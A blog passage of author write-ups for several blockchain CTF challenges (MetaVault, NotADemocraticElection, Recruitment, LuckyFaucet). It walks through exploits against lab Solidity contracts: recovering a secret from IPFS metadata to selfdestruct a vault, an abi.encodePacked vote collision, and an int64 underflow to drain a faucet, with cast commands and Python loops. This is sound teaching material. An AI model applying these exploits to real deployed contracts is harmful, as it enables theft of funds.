Deposit( msg.sender, msg.value, getVaultBalance() ); } /** * @notice Function to fire the emergency mode by selfdestructing the contract and transfering the funds away. * @param _secret The secret passphrase required to activate emergency mode. * @dev The secret is shared only to MoD devs. */ function emergency(string memory _secret) external { bytes32 attempt_k256 = keccak256(bytes(_secret)); if (attempt_k256 == VAULT_SECRET_K256) { emit EmergencyMode(msg.sender, msg.sender); selfdestruct(payable(msg.sender)); } else { emit FailedLoginAttempt(msg.sender, _secret, attempt_k256); } } } We are presented with a Vault contract, developed by the \u0026ldquo;Ministry of Defense\u0026rdquo; which aims to securely store national Ethereum assets.\nThe contract is quite verbose due to the NatSpec, but essentially converges to two functionalities:\nThe possibility of depositing funds. Emergency mode, which can only be activated by those who know a secret passphrase, which hash Keccak256 matches the one hardcoded in the contract. We immediately understand that we will probably have to find a way to have the secret in hand to be able to selfdestruct() the contract.\nHardcoded secret? ü§î # Looking at how the hash we need to obtain is declared, we notice how it is not possible to modify it, given that there is no storage access for that variable and it is mostly declared as constant and private.\nHowever, one very curious thing catches our eye: the NatSpec of this state variable.\n/** * @notice Keccak256 hashed secret passphrase to enable emergency mode. * @dev plaintext secret: [REDACTED] * @dev The secret will be stripped before open sourcing the code. Comments are not compiled anyway. */ What is that? Why would someone in charge of such an important task share to his developers a secret in plain text in the code??\nThe assumption was certainly made upon the fact that, the code once it gets compiled and deployed in the blockchain, comments will not be included in the bytecode; thus stating that they will only worry about removing the secret when they have to publish the source code.\nTerrible OPSEC! What could happen if the internal code was leaked? What could happen if‚Ä¶even worse, the comment was saved somewhere and published without realizing it?\nDoubts are starting to arise, but a hint in the frontend of the platform gives us some direction.\nSaid by the developers, the code was compiled with the metadata, a fairly common practice for anyone who wants to verify their smart contracts.\nBut, what really is metadata in smart contracts?\nSmart Contracts Metadata # Based on Solidity latest Documentation, Metadata informations are nothing more than additional bytes, CBOR-encoded, append to the end of the bytecode to be easily recoverable. The compiler automatically generates these informations (unless otherwise specified) in a JSON file, which includes:\nCompiler Version Compiler Settings Contract ABI Path of the compiled files NatSpec Documentation Wait, what?\nThe path to the file on my PC? Even the NatSpec?\nAbsolutely yes! And we can immediately verify this using that example contract of the NatSpec documentation.\nRather than opening it in Remix IDE, we prefer to tinker around locally by simply using solc, the Solidity compiler. We go to the /tmp directory, use our favorite text editor to copy and paste the code and save the file as MetadataTest.sol. Now all we have to do is compile it, but before doing this we read from the manual that we can easily read the metadata of a contract with the --metadata flag. Simple as that:\n$ solc --metadata /tmp/MetadataTest.sol ======= MetadataTest.sol:KumquatTree ======= Metadata: {\u0026#34;compiler\u0026#34;:{\u0026#34;version\u0026#34;:\u0026#34;0.8.25+commit.b61c2a91\u0026#34;},\u0026#34;language\u0026#34;:\u0026#34;Solidity\u0026#34;,\u0026#34;output\u0026#34;:{\u0026#34;abi\u0026#34;:[{\u0026#34;inputs\u0026#34;:[{\u0026#34;internalType\u0026#34;:\u0026#34;uint256\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;rings\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;uint256\u0026#34;}],\u0026#34;name\u0026#34;:\u0026#34;age\u0026#34;,\u0026#34;outputs\u0026#34;:[{\u0026#34;internalType\u0026#34;:\u0026#34;uint256\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;uint256\u0026#34;}],\u0026#34;stateMutability\u0026#34;:\u0026#34;pure\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;function\u0026#34;},{\u0026#34;inputs\u0026#34;:[],\u0026#34;name\u0026#34;:\u0026#34;leaves\u0026#34;,\u0026#34;outputs\u0026#34;:[{\u0026#34;internalType\u0026#34;:\u0026#34;uint256\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;uint256\u0026#34;}],\u0026#34;stateMutability\u0026#34;:\u0026#34;pure\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;function\u0026#34;}],\u0026#34;devdoc\u0026#34;:{\u0026#34;kind\u0026#34;:\u0026#34;dev\u0026#34;,\u0026#34;methods\u0026#34;:{\u0026#34;age(uint256)\u0026#34;:{\u0026#34;details\u0026#34;:\u0026#34;The Alexandr N. Tetearing algorithm could increase precision\u0026#34;,\u0026#34;params\u0026#34;:{\u0026#34;rings\u0026#34;:\u0026#34;The number of rings from dendrochronological sample\u0026#34;},\u0026#34;returns\u0026#34;:{\u0026#34;_0\u0026#34;:\u0026#34;Age in years, rounded up for partial years\u0026#34;}},\u0026#34;leaves()\u0026#34;:{\u0026#34;details\u0026#34;:\u0026#34;Returns only a fixed number.\u0026#34;}},\u0026#34;version\u0026#34;:1},\u0026#34;userdoc\u0026#34;:{\u0026#34;kind\u0026#34;:\u0026#34;user\u0026#34;,\u0026#34;methods\u0026#34;:{\u0026#34;age(uint256)\u0026#34;:{\u0026#34;notice\u0026#34;:\u0026#34;Calculate tree age in years, rounded up, for live trees\u0026#34;},\u0026#34;leaves()\u0026#34;:{\u0026#34;notice\u0026#34;:\u0026#34;Return the amount of leaves that this specific kind of tree has\u0026#34;}},\u0026#34;version\u0026#34;:1}},\u0026#34;settings\u0026#34;:{\u0026#34;compilationTarget\u0026#34;:{\u0026#34;tmp/MetadataTest.sol\u0026#34;:\u0026#34;KumquatTree\u0026#34;},\u0026#34;evmVersion\u0026#34;:\u0026#34;cancun\u0026#34;,\u0026#34;libraries\u0026#34;:{},\u0026#34;metadata\u0026#34;:{\u0026#34;bytecodeHash\u0026#34;:\u0026#34;ipfs\u0026#34;},\u0026#34;optimizer\u0026#34;:{\u0026#34;enabled\u0026#34;:false,\u0026#34;runs\u0026#34;:200},\u0026#34;remappings\u0026#34;:[]},\u0026#34;sources\u0026#34;:{\u0026#34;MetadataTest.sol\u0026#34;:{\u0026#34;keccak256\u0026#34;:\u0026#34;0x1ecb92832d772095e8f70b536826a13224d8ebd8d506556007448505faf58118\u0026#34;,\u0026#34;license\u0026#34;:\u0026#34;GPL-3.0\u0026#34;,\u0026#34;urls\u0026#34;:[\u0026#34;bzz-raw://2abff74bf1d86d205c14a6d144e04e7abf65e3e0a090ac0160815c0828300836\u0026#34;,\u0026#34;dweb:/ipfs/QmT5r1oLssy1MHKH1JBsoPSCUSe7qqvGEXumdfFLUyc39K\u0026#34;]}},\u0026#34;version\u0026#34;:1} ======= MetadataTest.sol:Plant ======= [...] We\u0026rsquo;ll get a lot of info! Which isn\u0026rsquo;t really readable, let\u0026rsquo;s store that information in some files using the --output-dir flag and analyze it using jq.\n$ solc --metadata /tmp/MetadataTest.sol --output-dir metadata Compiler run successful. Artifact(s) can be found in directory \u0026#34;metadata\u0026#34;. $ cd metadata/ \u0026amp;\u0026amp; ls -la total 20 drwxr-xr-x 2 root root 4096 May 9 23:25 . drwxrwxrwt 1 root root 4096 May 9 23:25 .. -rw-r--r-- 1 root root 1461 May 9 23:25 KumquatTree_meta.json -rw-r--r-- 1 root root 812 May 9 23:25 Plant_meta.json -rw-r--r-- 1 root root 1701 May 9 23:25 Tree_meta.json $ cat Tree_meta.json | jq # let\u0026#39;s read that for example { \u0026#34;compiler\u0026#34;: { \u0026#34;version\u0026#34;: \u0026#34;0.8.25+commit.b61c2a91\u0026#34; }, \u0026#34;language\u0026#34;: \u0026#34;Solidity\u0026#34;, \u0026#34;output\u0026#34;: { \u0026#34;abi\u0026#34;: [ [...] ], \u0026#34;devdoc\u0026#34;: { \u0026#34;author\u0026#34;: \u0026#34;Larry A. Gardner\u0026#34;, \u0026#34;custom:experimental\u0026#34;: \u0026#34;This is an experimental contract.\u0026#34;, \u0026#34;details\u0026#34;: \u0026#34;All function calls are currently implemented without side effects\u0026#34;, [...] } \u0026#34;settings\u0026#34;: { \u0026#34;compilationTarget\u0026#34;: { \u0026#34;tmp/MetadataTest.sol\u0026#34;: \u0026#34;Tree\u0026#34; }, [...] \u0026#34;sources\u0026#34;: { \u0026#34;tmp/MetadataTest.sol\u0026#34;: { \u0026#34;keccak256\u0026#34;: \u0026#34;0x1ecb92832d772095e8f70b536826a13224d8ebd8d506556007448505faf58118\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;GPL-3.0\u0026#34;, \u0026#34;urls\u0026#34;: [ \u0026#34;bzz-raw://2abff74bf1d86d205c14a6d144e04e7abf65e3e0a090ac0160815c0828300836\u0026#34;, \u0026#34;dweb:/ipfs/QmT5r1oLssy1MHKH1JBsoPSCUSe7qqvGEXumdfFLUyc39K\u0026#34; ] } }, \u0026#34;version\u0026#34;: 1 } Wow! It\u0026rsquo;s really like that. Notice the tmp/MetadataTest.sol field under \u0026quot;sources\u0026quot;, which could potentially leak sensitive information about our system to the public.\nAlso, note the appending urls. That are the IPFS hashes of the source code, which is useful to verify that our local code matches the one deployed on the blockchain.\nTo be clearer, the flow of verifying a smart contract source code will be the following:\n\u0026ndash;\u0026gt; Get the bytecode (always avaiable)\n\u0026ndash;\u0026gt; Get the contract metadata (most likely it\u0026rsquo;ll be there)\n\u0026ndash;\u0026gt; CBOR decode, get the keccak256 hash and verify the match with the local files\u0026hellip;\nOR\n\u0026ndash;\u0026gt; CBOR decode, get the IPFS hash of the JSON metadata file\n\u0026ndash;\u0026gt; Hopefully it\u0026rsquo;s pinned on IPFS, get the IPFS hash of the contract source code\n\u0026ndash;\u0026gt; Verify match.\nFurther readings:\nhttps://docs.sourcify.dev/blog/verify-contracts-perfectly/ https://www.rareskills.io/post/solidity-metadata But let\u0026rsquo;s get back on track! Did you also noticed something event more interesting for us?\nYeah, the NatSpec! What if they compiled the source code (and therefore generated metadata) before stripping the secret and accidentally leaking it here?\nThat\u0026rsquo;s possible. That\u0026rsquo;s what they said.\n@dev The secret will be stripped before open sourcing the code. [\u0026hellip;]\nBefore open sourcing the code, meaning that they compiled it with the secret!\n[\u0026hellip;] Comments are not compiled anyway.\nYou fool. Wrong assumption.\nSo, our goal now is to retrieve the bytecode, then the IPFS hash, check the avaiability on a IPFS gateway and finally read the leaked secret in the NatSpec.\nExploitation # Upon launching the challenge, we will encounter two sockets. One socket serves as the challenge handler, while the other serves as the RPC endpoint. Upon connecting to the challenge handler, we will be presented with three options:\n$ nc 0.0.0.0 1338 1 - Connection information 2 - Restart Instance 3 - Get flag action? Before proceeding, it\u0026rsquo;s essential to launch the game instance, which will provide us with the necessary information to establish a connection.\n$ nc 0.0.0.0 1338 1 - Connection information 2 - Restart Instance 3 - Get flag action? 1 Private key : 0x1e7ed27cf8804c820d69d04b69745634b54a989112752dd4ddd540e4dd6c1bc5 Address : 0x18Bdd72777BccB5bCb5590bE6c947B68B38066c6 Target contract : 0x406607888e97f1f4F1cb225fC002DF46b50a85D0 Setup contract : 0xC8333ab86099e2cDe792F81C4BA830CCb17D9B68 That\u0026rsquo;s fundamental for our first step, that is to recover the bytecode of the deployed code.\nTo do so, we can use cast tool to read the raw deployment transaction, or even better, use the cast code subcommand to get the runtime bytecode.\n$ cast code $TARGET --rpc-url $RPC 0x60806040...snip...0033 Easy. Now we need to decode the metadata. In order to do so, a lot of tools comes handy, but maybe the easier one is the Sourcify Playground which is also mentioned in the Solidity documentation.\nHere\u0026rsquo;s our IPFS hash! Sourcify can\u0026rsquo;t already fetch the IPFS gateway for us, because the ipfs.io domain isn\u0026rsquo;t avaible anymore\u0026hellip; that comes a challenge to the player.\nAt this point, we can really use any IPFS gateway. A list of live functioning gateways can be found here: https://ipfs.github.io/public-gateway-checker/\nExample with Pinata gateway:\nUI CLI\n$ curl https://gateway.pinata.cloud/ipfs/QmX9L9Q9QkM3ytQ1Wk3jKAqNDXYhK8RFQHcfq8QXyfffkN | jq [...] \u0026#34;stateVariables\u0026#34;: { \u0026#34;VAULT_SECRET_K256\u0026#34;: { \u0026#34;details\u0026#34;: \u0026#34;plaintext secret: WeLoveNukaCola!!MoD-2024 The secret will be stripped before open sourcing the code. Comments are not compiled anyway.\u0026#34; } } [...] Here\u0026rsquo;s the secret :)\nWeLoveNukaCola!!MoD-2024 Also, note the leaked path: All we have to do now is DESTROY the vault. That\u0026rsquo;s why demolition skills were required in the onboarding challenge ;)\n$ cast send $TARGET \u0026#39;emergency(string)\u0026#39; \u0026#39;WeLoveNukaCola!!MoD-2024\u0026#39; --rpc-url $RPC --private-key $PVK Bonus # If you\u0026rsquo;ll lucky enough, you\u0026rsquo;ll be able to solve the challenge only by using the following UI https://solc-metadata.ardis.lu/ ! Which partially explains the \u0026ldquo;Easy\u0026rdquo; tag in this challenge.\nHTB{wh0_tf_sh4r3s_s3cr3ts_1n_th3_c0mm3nts}\n","date":"10 May 2024","externalUrl":null,"permalink":"/posts/htb-businessctf-2024/metavault/","section":"Blog","summary":"Author writeup for the \u0026ldquo;MetaVault\u0026rdquo; easy blockchain challenge from HTB Business CTF 2024.","title":"HTB Business CTF 2024 - MetaVault [Author Writeup]","type":"posts"},{"content":"","date":"10 May 2024","externalUrl":null,"permalink":"/tags/ipfs/","section":"Tags","summary":"","title":"IPFS","type":"tags"},{"content":"","date":"10 May 2024","externalUrl":null,"permalink":"/tags/metadata/","section":"Tags","summary":"","title":"Metadata","type":"tags"},{"content":"","date":"10 May 2024","externalUrl":null,"permalink":"/tags/abi.encodepacked/","section":"Tags","summary":"","title":"Abi.encodePacked","type":"tags"},{"content":" NotADemocraticElection # 10th May 2024 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Easy\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-BusinessCTF-2024/NotADemocraticElection Synopsis # The challenge consist in exploiting a common signature forgery attack, i.e. when a signature is created using abi.encodePacked() function. Description # In the post-apocalyptic wasteland, the remnants of human and machine factions vie for control over the last vestiges of civilization. The Automata Liberation Front (ALF) and the Cyborgs Independence Movement (CIM) are the two primary parties seeking to establish dominance. In this harsh and desolate world, democracy has taken a backseat, and power is conveyed by wealth. Will you be able to bring back some Democracy in this hopeless land?\nSkills Required # Smart contract interaction. Skills Learned # Smart contract interaction. Signature Forgery/Collision attack Analyzing the source code # Let\u0026rsquo;s examine the provided source code.\nSetup.sol\npragma solidity 0.8.25; import {NotADemocraticElection} from \u0026#34;./NotADemocraticElection.sol\u0026#34;; contract Setup { NotADemocraticElection public immutable TARGET; constructor() payable { TARGET = new NotADemocraticElection( bytes3(\u0026#34;ALF\u0026#34;), \u0026#34;Automata Liberation Front\u0026#34;, bytes3(\u0026#34;CIM\u0026#34;), \u0026#34;Cyborgs Indipendence Movement\u0026#34; ); TARGET.depositVoteCollateral{value: 100 ether}(\u0026#34;Satoshi\u0026#34;, \u0026#34;Nakamoto\u0026#34;); } function isSolved() public view returns (bool) { return TARGET.winner() == bytes3(\u0026#34;CIM\u0026#34;); } } This setup will deploy the challenge instance for us. It appears that a TARGET contract, which is an on-chain voting contract, will be deployed with 2 parties competitors and an initial vote collateral by Satoshi Nakamoto (himself).\nOur goal is clear. We need to make the CIM party winner of the election.\nNotADemocraticElection.sol\npragma solidity 0.8.25; contract NotADemocraticElection { // **************************************************** // ******* NOTE: THIS NOT A DEMOCRATIC ELECTION ******* // **************************************************** uint256 constant TARGET_VOTES = 1000e18; struct Party { string fullname; uint256 totalvotes; } struct Voter { uint256 weight; address addr; } mapping(bytes3 _id =\u0026gt; Party) public parties; mapping(bytes _sig =\u0026gt; Voter) public voters; mapping(string _name =\u0026gt; mapping(string _surname =\u0026gt; address _addr)) public uniqueVoters; bytes3 public winner; event Voted( address _voter, bytes3 _party ); event VoterDeposited( address _voter, uint256 _weight ); event ElectionWinner( bytes3 _party ); constructor( bytes3 _partyAsymbol , string memory _partyAfullname, bytes3 _partyBsymbol , string memory _partyBfullname ) { parties[_partyAsymbol].fullname = _partyAfullname; parties[_partyBsymbol].fullname = _partyBfullname; } function getVotesCount(bytes3 _party) public view returns (uint256) { return parties[_party].totalvotes; } function getVoterSig(string memory _name, string memory _surname) public pure returns (bytes memory) { return abi.encodePacked(_name, _surname); } function checkWinner(bytes3 _party) public { if (parties[_party].totalvotes \u0026gt;= TARGET_VOTES) { winner = _party; emit ElectionWinner(_party); } } function depositVoteCollateral(string memory _name, string memory _surname) external payable { require(uniqueVoters[_name][_surname] == address(0), \u0026#34;Already deposited\u0026#34;); bytes memory voterSig = getVoterSig(_name, _surname); voters[voterSig].weight += msg.value; uniqueVoters[_name][_surname] = msg.sender; emit VoterDeposited(msg.sender, msg.value); } function vote( bytes3 _party, string memory _name, string memory _surname ) public { require(uniqueVoters[_name][_surname] == msg.sender, \u0026#34;You cannot vote on behalf of others.\u0026#34;); bytes memory voterSig = getVoterSig(_name, _surname); uint256 voterWeight = voters[voterSig].weight == 0 ? 1 : voters[voterSig].weight; parties[_party].totalvotes += 1 * voterWeight; emit Voted(msg.sender, _party); checkWinner(_party); } } We will leave out from the analysis the constructor, since the contract is already deployed with the two parties registered.\nHere\u0026rsquo;s a brief overview of the contract:\nThe contract has a vote function that allows a voter to vote for a party. The voter must have previously deposited a vote collateral. The contract has a depositVoteCollateral function that allows a voter to deposit a vote collateral. The voter must not have already deposited a vote collateral. The contract has a checkWinner function that checks if a party has reached the target votes and declares it the winner. The contract has a getVoterSig function that returns the signature of a voter based on the abi.encodePacked function. At first glance it looks like an easy win. There are not check on multiple votes by a single voter.\nHowever, this is was thought by the election organizers: restricting to only one vote per account wouldn\u0026rsquo;t stop a single voter to create multiple accounts and therefore vote multiple times. Because of that, the idea on this on-chain election was to base the voting system on the deposited ETH (As hinted by the \u0026quot;THIS IS NOT A DEMOCRATIC ELECTION\u0026quot; warning). A voter has to deposit some collateral to vote, meaning that voting from multiple accounts become meaningless, and works also as a cheap flash loan prevention.\nIt would seem that the player can still deposit 1 ETH, and vote 1000 times to reach the vote target. However since the players are provided with only a balance of 1 ETH, they will run out of gas. Lowering the vote weight by depositing 0.5 ETH and voting 2000 times would also not work, as the gas cost would still be too high. Any other combination of depositing and voting would probably fail due to gas costs, or will be too time consuming anyway.\nShifting the focus on the getVoterSig function, we can see that the signature is created using the abi.encodePacked function. This function is known to be vulnerable to signature collisions, as the ethereum documentation states.\nSignature forging attack therefore becomes a viable attack vector.\nNote that we can register a voter as \u0026ldquo;Satosh iNakamoto\u0026rdquo; and for the check at line 74 the malicious user will be a completely different voter from \u0026ldquo;Satoshi Nakamoto\u0026rdquo;:\nrequire(uniqueVoters[_name][_surname] == msg.sender, \u0026#34;You cannot vote on behalf of others.\u0026#34;);` However, his weight will be retrived by the signature which will collide with the voter \u0026ldquo;Satoshi Nakamoto\u0026rdquo; and consequently voting using its vote weight.\nbytes memory voterSig = getVoterSig(_name, _surname); uint256 voterWeight = voters[voterSig].weight == 0 ? 1 : voters[voterSig].weight; By replicating the attack several times with different Name-Surname pairs such as \u0026ldquo;Satos hiNakamoto\u0026rdquo; or \u0026ldquo;Sato shiNakamoto\u0026rdquo;, we could easily reach the voting target.\nExploitation # richvoter = \u0026#34;SatoshiNakamoto\u0026#34; for i in range(1, 12): name = richvoter[:i] surname = richvoter[i:] if not name == \u0026#34;Satoshi\u0026#34; and not surname == \u0026#34;Nakamoto\u0026#34;: print(f\u0026#34;[*] Attacking with voter: {name} {surname}\u0026#34;) csend(target, \u0026#34;depositVoteCollateral(string,string)\u0026#34;, name, surname) csend(target, \u0026#34;vote(bytes3,string,string)\u0026#34;, \u0026#34;0x\u0026#34;+b\u0026#34;CIM\u0026#34;.hex(), name, surname) HTB{h4sh_c0ll1s10n_t0_br1ng_b4ck_d3m0cr4cy}\n","date":"10 May 2024","externalUrl":null,"permalink":"/posts/htb-businessctf-2024/notademocraticelection/","section":"Blog","summary":"Author writeup for the \u0026ldquo;NotADemocraticElection\u0026rdquo; easy blockchain challenge from HTB Business CTF 2024.","title":"HTB Business CTF 2024 - NotADemocraticElection [Author Writeup]","type":"posts"},{"content":"","date":"10 May 2024","externalUrl":null,"permalink":"/tags/signatures/","section":"Tags","summary":"","title":"Signatures","type":"tags"},{"content":" Recruitment # 10th May 2024 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Very Easy\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-BusinessCTF-2024/Recruitment Synopsis # This challenge serves as an entry-level warmup for the blockchain category. Players will learn how to interact with the infrastructure and solve the challenge by satisfying transaction constraints. Description # Do you think you have what it takes to live up to this crew? apply and prove it.\nSkills Required # Smart contract interaction. Skills Learned # Smart contract interaction. block.timestamp, block.number, tx.origin, msg.sender, gasleft(). Analyzing the source code # Let\u0026rsquo;s examine the provided source code.\nSetup.sol\npragma solidity 0.8.25; import {Recruitment} from \u0026#34;./Recruitment.sol\u0026#34;; contract Setup { Recruitment public immutable TARGET; constructor() payable { TARGET = new Recruitment{value: 1 wei}(); } function isSolved() public view returns (bool) { return TARGET.isRecruited(msg.sender); } } This setup will deploy the challenge instance for us. It appears that a TARGET contract will be deployed with 1 wei in it. To solve the challenge, the isRectruited() function must return true with the player address as argument.\nRecruitment.sol\npragma solidity 0.8.25; contract Recruitment { constructor() payable {} mapping (address =\u0026gt; bool) public crew; function isRecruited(address _candidate) public view returns (bool) { return crew[_candidate]; } function application(uint16 input1, string memory input2) public { // In order to be eligible, you must match the following set of skills: // - Hacker // - Stealth Specialist // - Engineer // - Demolition Specialist // Let\u0026#39;s start! // Some preliminary checks: we do not hire unlucky people. require(block.timestamp % 2 == 0, \u0026#34;Natural selection people say..\u0026#34;); // CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) require(tx.origin == msg.sender, \u0026#34;Are you even human?\u0026#34;); // Now let\u0026#39;s start for real. // 1. Are you an hacker? require(input1 == 1337, \u0026#34;You lack hacking skills.\u0026#34;); // yeah you definitely are. // 2. Are you stealthy? require(block.number \u0026lt; 20, \u0026#34;You lack stealth skills.\u0026#34;); // 3. Are you an engineer? require(gasleft() \u0026lt;= 50000, \u0026#34;You lack engineering skills.\u0026#34;); // 4. Are you a demolition specialist? require(keccak256(abi.encodePacked(input2)) == keccak256(abi.encodePacked(\u0026#34;BOOM\u0026#34;)), \u0026#34;You lack demolition skills.\u0026#34;); // Congratulations! Welcome to the crew. crew[msg.sender] = true; // here is your reward :) payable(msg.sender).transfer(1 wei); } } The isRecruited() function fetch the crew mapping that tracks wheter a player is recruited in the crew or not.\nAt L41 it\u0026rsquo;s possible to write the player address in this mapping. In order to reach this goal we have to satisfy the preceding require statements and therefore prevent the transaction from reverting.\nLet\u0026rsquo;s explore the conditions.\nCondition 1 # require(block.timestamp % 2 == 0, \u0026#34;Natural selection people say..\u0026#34;); The first condition ensure that the timestamp (current block timestamp as seconds since unix epoch) is even. Since this isn\u0026rsquo;t a random value it\u0026rsquo;s easy for the player to send the transaction at a specific time or just flip the coin.\nCondition 2 # require(tx.origin == msg.sender, \u0026#34;Are you even human?\u0026#34;); The second condition forbids interaction of external smart contract. Since the tx.origin (the original sender of the transaction) must be the same as the final transaction, no intermediary, such as a smart contract, can bypass this check.\nCondition 3 # require(input1 == 1337, \u0026#34;You lack hacking skills.\u0026#34;); The third require statement is actually the first check about the mentioned required skills. The first skill to match is the \u0026ldquo;Hacking skill\u0026rdquo; which just require to send 1337 as first function argument. A very hacky number.\nCondition 4 # require(block.number \u0026lt; 20, \u0026#34;You lack stealth skills.\u0026#34;); The second skill check is about \u0026ldquo;Stealthiness\u0026rdquo;. In a real smart contract attack scenario, the interaction must be clinical. Hence, in order to solve this challenge the player must solve it in the first 20 blocks (which isn\u0026rsquo;t really stealthy but players sanity was preferred).\nCondition 5 # require(gasleft() \u0026lt;= 50000, \u0026#34;You lack engineering skills.\u0026#34;); The third skill requires to be an \u0026ldquo;Engineer\u0026rdquo;. Indeed players need to engineer their gas consumption by sending a transaction with very low gas avaiability such that when the execution reaches this point, there are no more than 50000 gas left. This can be accomplished by setting a gas threshold when calling the contract. Using cast tool this can be done with the --gas-limit option.\nCondition 6 # require(abi.encodePacked(input2) == abi.encodePacked(\u0026#34;BOOM\u0026#34;), \u0026#34;You lack demolition skills.\u0026#34;); The final requirement is to be a \u0026ldquo;Demolition Specialist\u0026rdquo;. And what distinguishes a demolition specialist? Obviously in sending the string BOOM as the second function argument.\nExploitation # Firstly To interact with the challenge blockchain, various tools are available to us, such as web3.py/web3js library, cast tool, and others.\nIn this example will be used cast.\nTo send a state-changing transaction to a contract we have to use the send subcommand of cast.\nTo specify the function to call and it\u0026rsquo;s arguments it\u0026rsquo;ll be sufficient to use the function signature (function name + argument types separated by comma and without spaces) followed by our inputs, like the following:\n$ cast send --help Sign and publish a transaction Usage: cast send [OPTIONS] [TO] [SIG] [ARGS]... [COMMAND] $ cast send $CONTRACT_ADDR \u0026#34;application(uint16,string)\u0026#34; 1337 \u0026#34;BOOM\u0026#34; We also need to specify the gas usage. 60k gas is low enough to solve the challenge. Our command becomes:\n$ cast send $CONTRACT_ADDR \u0026#34;application(uint16,string)\u0026#34; 1337 \u0026#34;BOOM\u0026#34; --gas-limit 60000 Finally, we need to specify the given --rpc-url and our player --private-key provided by the infrastructure.\n$ cast send $CONTRACT_ADDR \u0026#34;application(uint16,string)\u0026#34; 1337 \u0026#34;BOOM\u0026#34; --gas-limit 60000 --rpc-url $RPC --private-key $PVK Fetching the information # Upon launching the challenge, we will encounter two sockets. One socket serves as the challenge handler, while the other serves as the RPC endpoint. Upon connecting to the challenge handler, we will be presented with three options:\n$ nc 0.0.0.0 1338 1 - Connection information 2 - Restart Instance 3 - Get flag action? Before proceeding, it\u0026rsquo;s essential to launch the game instance, which will provide us with the necessary information to establish a connection.\n$ nc 0.0.0.0 1338 1 - Connection information 2 - Restart Instance 3 - Get flag action? 1 Private key : 0x1e7ed27cf8804c820d69d04b69745634b54a989112752dd4ddd540e4dd6c1bc5 Address : 0x18Bdd72777BccB5bCb5590bE6c947B68B38066c6 Target contract : 0x406607888e97f1f4F1cb225fC002DF46b50a85D0 Setup contract : 0xC8333ab86099e2cDe792F81C4BA830CCb17D9B68 Getting the flag # We can create a simple Python script to execute a cast send command repeatedly until we solve the \u0026ldquo;50/50\u0026rdquo; condition and get the flag.\nwhile True: # try luck csend(target, \u0026#34;application(uint16,string)\u0026#34;, \u0026#34;1337\u0026#34;, \u0026#34;BOOM\u0026#34;) # get flag with remote(TCP_URL.split(\u0026#34;:\u0026#34;)[0], int(TCP_URL.split(\u0026#34;:\u0026#34;)[1])) as p: p.recvuntil(b\u0026#34;action? \u0026#34;) p.sendline(b\u0026#34;3\u0026#34;) flag = p.recvall().decode() if \u0026#34;HTB\u0026#34; in flag: print(f\u0026#34;\\n\\n[*] {flag}\u0026#34;) break HTB{th3y_s4id_W3lc0m3_Ab0ard}\n","date":"10 May 2024","externalUrl":null,"permalink":"/posts/htb-businessctf-2024/recruitment/","section":"Blog","summary":"Author writeup for the \u0026ldquo;Recruitment\u0026rdquo; very-easy blockchain challenge from HTB Business CTF 2024.","title":"HTB Business CTF 2024 - Recruitment [Author Writeup]","type":"posts"},{"content":"","date":"9 March 2024","externalUrl":null,"permalink":"/tags/bitcoin/","section":"Tags","summary":"","title":"Bitcoin","type":"tags"},{"content":"","date":"9 March 2024","externalUrl":null,"permalink":"/tags/electrum/","section":"Tags","summary":"","title":"Electrum","type":"tags"},{"content":" LuckyFaucet # Date: 9th March 2024 Challenge Author: perrythepwner Difficulty: Easy Category: Blockchain\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-CyberApocalypse-2024/LuckyFaucet TL;DR # The challenge consists in draining a generous faucet by exploiting an unsafe casting from int64 to uint64 in Solidity 0.7.6 (latest Solidity version before 0.8.0 breaking changes of native integer overflow checks) that causes an integer underflow in case of negative bounds set. Description # I left a faucet along the path for adventurers capable of overcoming the first hurdles. It should provide enough resources for all players\u0026hellip; hoping that someone won\u0026rsquo;t be able to break it and leave none to others.\nSkills Required # Smart contract interaction. Skills Learned # Unsafe casting for contracts before Solidity 0.8.0 Integer underflows/overflows for contracts before Solidity 0.8.0 Challenge scenario # In this easy blockchain challenge we\u0026rsquo;re given only one target address to interact with, that is the LuckyFaucet contract. The contract is a simple faucet that gives out random quantity of ETH within a given range.\nThis range can be modified by the preferences \u0026amp; needs of the player, both lowerBound and upperBound.\nThe quantity of ETH given out is determined by the previous block hash converted in uint256, which is not a real source of randomness. However, since the contracts sets 100M Wei (0.0000000001 ETH) as the maximum output value, and we need at least 10 ETH to solve the challenge, we don\u0026rsquo;t really care about \u0026ldquo;hacking\u0026rdquo; the randomness, since it would require 100_000_000_000 function calls to get to 10 ETH with 100M wei for each output.\nSolution # Searching for low hanging fruit vulnerabilities in the contract that would allow us to send us more ETH than the contract allows, we will find nothing. On the other hand, the contract does not have many lines, which means that perhaps we should sharpen our sight a little more and not take everything for granted.\nIn fact, we will notice that not all the integer types used in the contract are of the same size (256 bits). Because, as the comments explains, 64 bits are enough to calculate the output value, since the maximum integer rapresentable by uint64 is ~18 ETH and the faucet \u0026ldquo;will never worry about sending more\u0026rdquo;.\nBut first of all, we note also that not all integers are uint, in fact there are also int (signed integers). This means that they allow negative values ‚Äã‚Äãto be represented.\nMoreover, we note how - in a somewhat hidden way - an int64 is cast to uint64 at Line 28; and what happens when a negative value represented by a signed integer is tried to be represented by an unsigned integer?\nIt underflows. e.g.:\n-1 in int64 == 2**64 - 1 in uint64\nWhich means that if we set bounds to negative values like:\nupperBound = -1\nlowerBound = -2\nWe will have an underflow when the contract will try to cast -1 or -2 to uint64 and it will be represented as 2**64 - 1 and 2**64 - 2 respectively, which is a little more than 18 ETH.\nEnough to solve the challenge.\nExploitation # Set the bounds to negative values: $ cast send --rpc-url $RPC_URL --private-key $PVK $TARGET \u0026#34;setBounds(int64,int64)\u0026#34; -- -2 -1 Drain the contract and win: 